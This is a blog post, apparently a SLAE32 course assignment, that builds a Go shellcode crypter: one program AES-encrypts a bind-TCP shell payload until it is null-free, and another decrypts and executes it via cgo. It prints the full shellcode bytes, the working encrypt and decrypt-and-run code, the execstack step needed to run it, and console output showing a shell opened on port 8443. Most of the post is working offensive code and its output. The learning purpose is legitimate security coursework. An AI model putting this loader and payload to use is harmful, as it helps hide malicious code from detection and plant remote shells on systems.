---
layout: single 
classes: wide
title:  "Custom Shellcode Crypter"
date:   2020-04-05 10:30:06 +0800
categories: jekyll update
---

For the last assigment, i choose to use Golang as programming language, this is new programming language for me, so bear with me :).

## Requirements

- Create a custom crypter
- Free to use any existing encryption schema
- Can use any programming language

## Encryption

The encryption schema is using AES ([Advanced Encryption Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)), also known as Rijndael encryption method, is used by the U.S. federal government as a block encryption standard, is a symmetric key encryption algorithm. 
I've used Golang standard library [aes](https://godoc.org/crypto/aes) implementation. The Golang code is written in go version `go1.14 linux/386`. The program will require one AES key as argument (16 chars). The Bind TCP shellcode from the Assigment #1 will use as sample to test the encryption. The program will encrypt the shellcode with the key and if theencrypted shellcode output contains the `null bytes` the program will keep trying to encrypt until the output of the encrypted shellcode is null free.

{% highlight golang linenos %}
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"strings"
)

func main() {
    // bind tcp shellcode assigment #1
	// 0.0.0.0 port 8443 
	origShellcode := []byte{
		0x31, 0xc9, 0xf7, 0xe1, 0x99, 0x6a, 0x66, 0x58, 0x6a,
		0x01, 0x5b, 0x51, 0x6a, 0x01, 0x6a, 0x02, 0x89, 0xe1,
		0xcd, 0x80, 0x97, 0x6a, 0x66, 0x58, 0x6a, 0x02, 0x5b,
		0x52, 0x66, 0x68, 0x20, 0xfb, 0x66, 0x53, 0x89, 0xe1,
		0x6a, 0x10, 0x51, 0x57, 0x89, 0xe1, 0xcd, 0x80, 0x6a,
		0x66, 0x58, 0x6a, 0x04, 0x5b, 0x31, 0xf6, 0x56, 0x57,
		0x89, 0xe1, 0xcd, 0x80, 0x6a, 0x66, 0x58, 0x6a, 0x05,
		0x5b, 0x56, 0x56, 0x57, 0x89, 0xe1, 0xcd, 0x80, 0x89,
		0xc3, 0x6a, 0x02, 0x59, 0xb0, 0x3f, 0xcd, 0x80, 0x49,
		0x79, 0xf9, 0x6a, 0x0b, 0x58, 0x31, 0xc9, 0x51, 0x51,
		0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69,
		0x6e, 0x89, 0xe3, 0xcd, 0x80}

	if len(os.Args[1]) != 16 {
		fmt.Println("ERROR: Key must be 16 chars")
		os.Exit(1)
	}
	//key := []byte("deadbeefdeafface")
	key := []byte(os.Args[1])

	fmt.Printf("[+] Original shellcode:\n")
	for x, element := range origShellcode {
		if x == len(origShellcode)-1 {
			fmt.Printf("%#x", element)
		} else {
			fmt.Printf("%#x,", element)
		}
	}
	fmt.Printf("\n\n")

	fmt.Printf("[x] Key:\n%s\n\n", key)

	cryptoText := []byte{}
	valid := true
	i := 0

	fmt.Println("[+] Trying to encrypt the shellcode..")
	for valid {
		fmt.Println("Iter: ", i)

		// encrypt
		cryptoText = encrypt(key, origShellcode)
		nullIndex := strings.Index(string(cryptoText), "\x00")

		if nullIndex < 0 {
			valid = false
		} else {
			fmt.Printf("[-] Null bytes found!: index=%v\n", nullIndex)
			fmt.Printf("% x", cryptoText)
			fmt.Printf("\n\n")
		}
		i++
	}

	fmt.Printf("[*] Encrypted shellcode (null free):\n")
	for x, element := range cryptoText {
		if x == len(cryptoText)-1 {
			fmt.Printf("%#x", element)
		} else {
			fmt.Printf("%#x,", element)
		}
	}

	fmt.Printf("\n\n")
}

func encrypt(key []byte, text []byte) []byte {
	plaintext := []byte(text)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	ctext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ctext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ctext[aes.BlockSize:], plaintext)

	return ctext
}
{% endhighlight %}

### Testing out Encryption

To compile and run the code `go build aes_dec.go` and i've used `deadbeefdeafface` as key for argument. 

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/go$ go run aes_enc.go deadbeefdeafface
[+] Original shellcode:
0x31,0xc9,0xf7,0xe1,0x99,0x6a,0x66,0x58,0x6a,0x1,0x5b,0x51,0x6a,0x1,0x6a,0x2,0x89,0xe1,0xcd,0x80,0x97,0x6a,
0x66,0x58,0x6a,0x2,0x5b,0x52,0x66,0x68,0x20,0xfb,0x66,0x53,0x89,0xe1,0x6a,0x10,0x51,0x57,0x89,0xe1,0xcd,0x80,
0x6a,0x66,0x58,0x6a,0x4,0x5b,0x31,0xf6,0x56,0x57,0x89,0xe1,0xcd,0x80,0x6a,0x66,0x58,0x6a,0x5,0x5b,0x56,0x56,
0x57,0x89,0xe1,0xcd,0x80,0x89,0xc3,0x6a,0x2,0x59,0xb0,0x3f,0xcd,0x80,0x49,0x79,0xf9,0x6a,0xb,0x58,0x31,0xc9,
0x51,0x51,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0xcd,0x80

[x] Key:
deadbeefdeafface

[+] Trying to encrypt the shellcode..
Iter:  0
[*] Encrypted shellcode (null free):
0x17,0xdc,0x65,0xe5,0x7b,0xcf,0x23,0xee,0xfa,0xb2,0xb5,0x80,0x88,0x6b,0x47,0xd5,0x46,0x3c,0xbc,0xe8,0x1a,0xd0,
0x39,0xac,0x41,0x1f,0xa8,0xfa,0xf4,0xc5,0xb4,0x99,0x1f,0x9d,0xda,0x91,0x42,0x1b,0xb1,0x7a,0x8e,0x52,0x50,0xc2,
0xf6,0xcc,0xf3,0xef,0xb5,0xb2,0x18,0x1a,0x20,0x66,0x2b,0x77,0xd5,0x63,0x8,0x5,0xee,0xb8,0xde,0x4d,0xd5,0x5a,
0x7e,0xd7,0x68,0x24,0x61,0x8,0x44,0x4d,0x2,0x2c,0xda,0x50,0xb4,0x55,0x1,0xa9,0x3e,0x99,0xd8,0xfa,0x39,0xa6,
0x9b,0xc9,0x1f,0xcd,0x13,0xb9,0xd6,0x5b,0x26,0x15,0xbd,0xd4,0x80,0x47,0x11,0x4,0x55,0xf9,0xde,0xa4,0x7,0xd9,
0x4f,0x2b,0x9f,0x51,0xac,0x9,0x91,0xd2,0x56,0x53
{% endhighlight %}

## Decryption

After run the encryption program, the encrypted shellcode result we can put on the decrypt code below. After encrypyted shellcode decrypted successfully the program will execute the shellcode.

{% highlight golang linenos %}
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"os"
	"unsafe"
)

/*
#include<stdio.h>
#include<string.h>

void run_shellcode(char *code)
{
    int (*ret)() = (int(*)())code;
    ret();
}
*/
import "C"

func main() {

	encShellcode := []byte{
		0x17, 0xdc, 0x65, 0xe5, 0x7b, 0xcf, 0x23, 0xee, 0xfa, 0xb2, 0xb5, 0x80,
		0x88, 0x6b, 0x47, 0xd5, 0x46, 0x3c, 0xbc, 0xe8, 0x1a, 0xd0, 0x39, 0xac,
		0x41, 0x1f, 0xa8, 0xfa, 0xf4, 0xc5, 0xb4, 0x99, 0x1f, 0x9d, 0xda, 0x91,
		0x42, 0x1b, 0xb1, 0x7a, 0x8e, 0x52, 0x50, 0xc2, 0xf6, 0xcc, 0xf3, 0xef,
		0xb5, 0xb2, 0x18, 0x1a, 0x20, 0x66, 0x2b, 0x77, 0xd5, 0x63, 0x8,  0x5,
		0xee, 0xb8, 0xde, 0x4d, 0xd5, 0x5a, 0x7e, 0xd7, 0x68, 0x24, 0x61, 0x8,
		0x44, 0x4d, 0x2,  0x2c, 0xda, 0x50, 0xb4, 0x55, 0x1,  0xa9, 0x3e, 0x99,
		0xd8, 0xfa, 0x39, 0xa6, 0x9b, 0xc9, 0x1f, 0xcd, 0x13, 0xb9, 0xd6, 0x5b,
		0x26, 0x15, 0xbd, 0xd4, 0x80, 0x47, 0x11, 0x4,  0x55, 0xf9, 0xde, 0xa4,
		0x7,  0xd9, 0x4f, 0x2b, 0x9f, 0x51, 0xac, 0x9,  0x91, 0xd2, 0x56, 0x53}

	encShellcodeStr := hex.EncodeToString(encShellcode)

	if len(os.Args[1]) != 16 {
		fmt.Println("ERROR: Key must be 16 chars")
		os.Exit(1)
	}
	//key := []byte("deadbeefdeafface")
	key := []byte(os.Args[1])

	fmt.Printf("[*] Encrypted shellcode:\n")
	for x, element := range encShellcodeStr {
		if x == len(encShellcodeStr)-1 {
			fmt.Printf("%#x", element)
		} else {
			fmt.Printf("%#x,", element)
		}
	}
	fmt.Printf("\n\n")

	fmt.Printf("[x] Key:\n%s\n\n", key)

	// decrypt
	decryptText := decrypt(key, encShellcodeStr)
	fmt.Printf("[*] Decrypted shellcode:\n")
	for x, element := range decryptText {
		if x == len(decryptText)-1 {
			fmt.Printf("%#x", element)
		} else {
			fmt.Printf("%#x,", element)
		}
	}
	fmt.Printf("\n\n[*] Executing shellcode..\n\n")

	C.run_shellcode((*C.char)(unsafe.Pointer(&decryptText[0])))

}

func decrypt(key []byte, text string) []byte {
	ctext, _ := hex.DecodeString(text)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	iv := ctext[:aes.BlockSize]
	ctext = ctext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ctext, ctext)

	return ctext
}
{% endhighlight %}

### Testing out Decryption

To compile the decrypt program `go build aes_dec.go`, and to run we need to specify the key as argument `./aes_dec deadbeefdeafface`. 

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/go$ go build aes_dec.go

kecebong@ubuntu:~/slae32/assigment/go$ ./aes_dec deadbeefdeafface
[*] Encrypted shellcode:
0x31,0x37,0x64,0x63,0x36,0x35,0x65,0x35,0x37,0x62,0x63,0x66,0x32,0x33,0x65,0x65,0x66,0x61,0x62,0x32,0x62,
0x35,0x38,0x30,0x38,0x38,0x36,0x62,0x34,0x37,0x64,0x35,0x34,0x36,0x33,0x63,0x62,0x63,0x65,0x38,0x31,0x61,
0x64,0x30,0x33,0x39,0x61,0x63,0x34,0x31,0x31,0x66,0x61,0x38,0x66,0x61,0x66,0x34,0x63,0x35,0x62,0x34,0x39,
0x39,0x31,0x66,0x39,0x64,0x64,0x61,0x39,0x31,0x34,0x32,0x31,0x62,0x62,0x31,0x37,0x61,0x38,0x65,0x35,0x32,
0x35,0x30,0x63,0x32,0x66,0x36,0x63,0x63,0x66,0x33,0x65,0x66,0x62,0x35,0x62,0x32,0x31,0x38,0x31,0x61,0x32,
0x30,0x36,0x36,0x32,0x62,0x37,0x37,0x64,0x35,0x36,0x33,0x30,0x38,0x30,0x35,0x65,0x65,0x62,0x38,0x64,0x65,
0x34,0x64,0x64,0x35,0x35,0x61,0x37,0x65,0x64,0x37,0x36,0x38,0x32,0x34,0x36,0x31,0x30,0x38,0x34,0x34,0x34,
0x64,0x30,0x32,0x32,0x63,0x64,0x61,0x35,0x30,0x62,0x34,0x35,0x35,0x30,0x31,0x61,0x39,0x33,0x65,0x39,0x39,
0x64,0x38,0x66,0x61,0x33,0x39,0x61,0x36,0x39,0x62,0x63,0x39,0x31,0x66,0x63,0x64,0x31,0x33,0x62,0x39,0x64,
0x36,0x35,0x62,0x32,0x36,0x31,0x35,0x62,0x64,0x64,0x34,0x38,0x30,0x34,0x37,0x31,0x31,0x30,0x34,0x35,0x35,
0x66,0x39,0x64,0x65,0x61,0x34,0x30,0x37,0x64,0x39,0x34,0x66,0x32,0x62,0x39,0x66,0x35,0x31,0x61,0x63,0x30,
0x39,0x39,0x31,0x64,0x32,0x35,0x36,0x35,0x33

[x] Key:
deadbeefdeafface

[*] Decrypted shellcode:
0x31,0xc9,0xf7,0xe1,0x99,0x6a,0x66,0x58,0x6a,0x1,0x5b,0x51,0x6a,0x1,0x6a,0x2,0x89,0xe1,0xcd,0x80,0x97,0x6a,
0x66,0x58,0x6a,0x2,0x5b,0x52,0x66,0x68,0x20,0xfb,0x66,0x53,0x89,0xe1,0x6a,0x10,0x51,0x57,0x89,0xe1,0xcd,0x80,
0x6a,0x66,0x58,0x6a,0x4,0x5b,0x31,0xf6,0x56,0x57,0x89,0xe1,0xcd,0x80,0x6a,0x66,0x58,0x6a,0x5,0x5b,0x56,0x56,
0x57,0x89,0xe1,0xcd,0x80,0x89,0xc3,0x6a,0x2,0x59,0xb0,0x3f,0xcd,0x80,0x49,0x79,0xf9,0x6a,0xb,0x58,0x31,0xc9,
0x51,0x51,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0xcd,0x80

[*] Executing shellcode..

fatal error: unexpected signal during runtime execution
[signal SIGSEGV: segmentation violation code=0x2 addr=0xa4721f0 pc=0xa4721f0]

runtime stack:
runtime.throw(0x80fa973, 0x2a)
        /usr/local/go/src/runtime/panic.go:1112 +0x6a
runtime.sigpanic()
        /usr/local/go/src/runtime/signal_unix.go:671 +0x39d

goroutine 1 [syscall]:
runtime.cgocall(0x80cfba0, 0xa42a6a8, 0xa470090)
        /usr/local/go/src/runtime/cgocall.go:133 +0x67 fp=0xa42a694 sp=0xa42a67c pc=0x804b4b7
main._Cfunc_run_shellcode(0xa4721f0)
        _cgo_gotypes.go:43 +0x33 fp=0xa42a6a8 sp=0xa42a694 pc=0x80cf213
main.main()
        /home/kecebong/slae32/assigment/go/aes_dec.go:72 +0x6f6 fp=0xa42a7c8 sp=0xa42a6a8 pc=0x80cf946
runtime.main()
        /usr/local/go/src/runtime/proc.go:203 +0x1fd fp=0xa42a7f0 sp=0xa42a7c8 pc=0x807608d
runtime.goexit()
        /usr/local/go/src/runtime/asm_386.s:1337 +0x1 fp=0xa42a7f4 sp=0xa42a7f0 pc=0x809ca01
{% endhighlight %}
		
But when execute the program the error triggered.

```
fatal error: unexpected signal during runtime execution
[signal SIGSEGV: segmentation violation code=0x2 addr=0xa4721f0 pc=0xa4721f0]
```

To fix this error, we need to run [`execstack`](https://linux.die.net/man/8/execstack) is a program which sets, clears, or queries executable stack flag of ELF binaries and shared libraries. Linux has in the past allowed execution of instructions on the stack and there are lots of binaries and shared libraries assuming this behaviour. To install in Ubuntu:

```
$ sudo apt-get install prelink
```

From the `execstack` command help, we need to use option `-s`, to set executable stack flag bit on the binary.

```
kecebong@ubuntu:~/slae32/assigment/go$ execstack --help
Usage: execstack [OPTION...]
execstack -- program to query or set executable stack flag

  -c, --clear-execstack      Clear executable stack flag bit
  -q, --query                Query executable stack flag bit
  -s, --set-execstack        Set executable stack flag bit
  -?, --help                 Give this help list
      --usage                Give a short usage message
  -V, --version              Print program version

Report bugs to <jakub@redhat.com>.
```

After set the executable stack flag bit on the `aes_dec` binary, we can see the shellcode is successfully decrypted and run. Because the original shellcode is Shell Bind TCP from Assigment #1, we can verify after the decrypt program run, it's listening to port `8443` and we can verify it by connecting to the port `8443` by using `nc` and we get shell. In below output i've used `tmux` with 2 split panes.

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/go$ go build aes_dec.go

kecebong@ubuntu:~/slae32/assigment/go$ execstack -s ./aes_dec

kecebong@ubuntu:~/slae32/assigment/go$ /tmp/aes_dec deadbeefdeafface
[*] Encrypted shellcode:
0x31,0x37,0x64,0x63,0x36,0x35,0x65,0x35,0x37,0x62,0x63,0x66,0x32,0x33,0x65,0x65,0x66,0x61,0x62,0x32,0x62,0x35,
0x38,0x30,0x38,0x38,0x36,0x62,0x34,0x37,0x64,0x35,0x34,0x36,0x33,0x63,0x62,0x63,0x65,0x38,0x31,0x61,0x64,0x30,
0x33,0x39,0x61,0x63,0x34,0x31,0x31,0x66,0x61,0x38,0x66,0x61,0x66,0x34,0x63,0x35,0x62,0x34,0x39,0x39,0x31,0x66,
0x39,0x64,0x64,0x61,0x39,0x31,0x34,0x32,0x31,0x62,0x62,0x31,0x37,0x61,0x38,0x65,0x35,0x32,0x35,0x30,0x63,0x32,
0x66,0x36,0x63,0x63,0x66,0x33,0x65,0x66,0x62,0x35,0x62,0x32,0x31,0x38,0x31,0x61,0x32,0x30,0x36,0x36,0x32,0x62,
0x37,0x37,0x64,0x35,0x36,0x33,0x30,0x38,0x30,0x35,0x65,0x65,0x62,0x38,0x64,0x65,0x34,0x64,0x64,0x35,0x35,0x61,
0x37,0x65,0x64,0x37,0x36,0x38,0x32,0x34,0x36,0x31,0x30,0x38,0x34,0x34,0x34,0x64,0x30,0x32,0x32,0x63,0x64,0x61,
0x35,0x30,0x62,0x34,0x35,0x35,0x30,0x31,0x61,0x39,0x33,0x65,0x39,0x39,0x64,0x38,0x66,0x61,0x33,0x39,0x61,0x36,
0x39,0x62,0x63,0x39,0x31,0x66,0x63,0x64,0x31,0x33,0x62,0x39,0x64,0x36,0x35,0x62,0x32,0x36,0x31,0x35,0x62,0x64,
0x64,0x34,0x38,0x30,0x34,0x37,0x31,0x31,0x30,0x34,0x35,0x35,0x66,0x39,0x64,0x65,0x61,0x34,0x30,0x37,0x64,0x39,
0x34,0x66,0x32,0x62,0x39,0x66,0x35,0x31,0x61,0x63,0x30,0x39,0x39,0x31,0x64,0x32,0x35,0x36,0x35,0x33

[x] Key:
deadbeefdeafface
[*] Decrypted shellcode:0x31,0xc9,0xf7,0xe1,0x99,0x6a,0x66,0x58,0x6a,0x1,0x5b,0x51,0x6a,0x1,0x6a,0x2,0x89,0xe1,
0xcd,0x80,0x97,0x6a,0x66,0x58,0x6a,0x2,0x5b,0x52,0x66,0x68,0x20,0xfb,0x66,0x53,0x89,0xe1,0x6a,0x10,0x51,0x57,
0x89,0xe1,0xcd,0x80,0x6a,0x66,0x58,0x6a,0x4,0x5b,0x31,0xf6,0x56,0x57,0x89,0xe1,0xcd,0x80,0x6a,0x66,0x58,0x6a,
0x5,0x5b,0x56,0x56,0x57,0x89,0xe1,0xcd,0x80,0x89,0xc3,0x6a,0x2,0x59,0xb0,0x3f,0xcd,0x80,0x49,0x79,0xf9,0x6a,0xb,
0x58,0x31,0xc9,0x51,0x51,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0xcd,0x80

[*] Executing shellcode..


────────────────────────────────────────────────────────────────────────────────────────────────────────
kecebong@ubuntu:~/slae32/assigment$ lsof -i :8443
COMMAND  PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
aes_dec 5443 kecebong    3u  IPv4  72812      0t0  TCP *:8443 (LISTEN)

kecebong@ubuntu:~/slae32/assigment$ nc -v localhost 8443
Connection to localhost 8443 port [tcp/*] succeeded!
uptime
 12:08:03 up 15:56,  1 user,  load average: 0.00, 0.01, 0.05
whoamikecebong
date
Wed Apr  1 12:08:09 SGT 2020
exit
{% endhighlight %}

## Demo
![image](/assets/img/assigment7.gif)

{% include_relative slae32.html %}